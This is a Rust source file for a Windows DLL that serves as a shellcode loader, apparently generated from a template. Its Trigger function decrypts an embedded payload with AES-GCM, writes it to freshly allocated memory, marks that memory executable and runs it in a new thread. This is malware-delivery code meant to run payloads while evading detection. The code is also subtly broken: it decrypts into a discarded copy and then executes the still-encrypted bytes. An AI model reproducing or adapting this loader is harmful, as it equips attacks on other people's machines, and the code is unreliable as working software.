use windows::Win32::{Foundation::{HANDLE, HMODULE}, System::{Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE}, Threading::WaitForSingleObject}};
use std::thread;
use std::ptr;
use aes_gcm::{
    aead::{AeadMutInPlace, KeyInit}, Aes256Gcm, Key
};

pub mod shellcode;


{}


#[no_mangle]
pub extern "C" fn Trigger() {
    
    unsafe {
        let address_pointer = VirtualAlloc(None, shellcode::SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

        let byte_key: [u8; 32] = Default::default();
        let byte_nonce: [u8; 12] = Default::default();
        let key = Key::<Aes256Gcm>::from_slice(&byte_key);
        let mut cipher = Aes256Gcm::new(&key);
        cipher.decrypt_in_place((&byte_nonce).into(), b"", &mut shellcode::SHELLCODE.to_vec());
        
        ptr::copy(shellcode::SHELLCODE.as_ptr(), address_pointer as *mut u8, shellcode::SIZE);
        let old_protection = &mut PAGE_PROTECTION_FLAGS(0);
        _ = VirtualProtect(address_pointer, shellcode::SIZE, PAGE_EXECUTE_READ, old_protection);
        let function_pointer: fn() -> () = std::mem::transmute(address_pointer);
        thread::spawn(move || {
            function_pointer();
        });
        
        WaitForSingleObject(HANDLE(-1), u32::MAX);
    };

}

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(h_module: HMODULE, call_reason: u32, _: *mut ()) -> bool {
    if call_reason == 1 {
    }

    true
}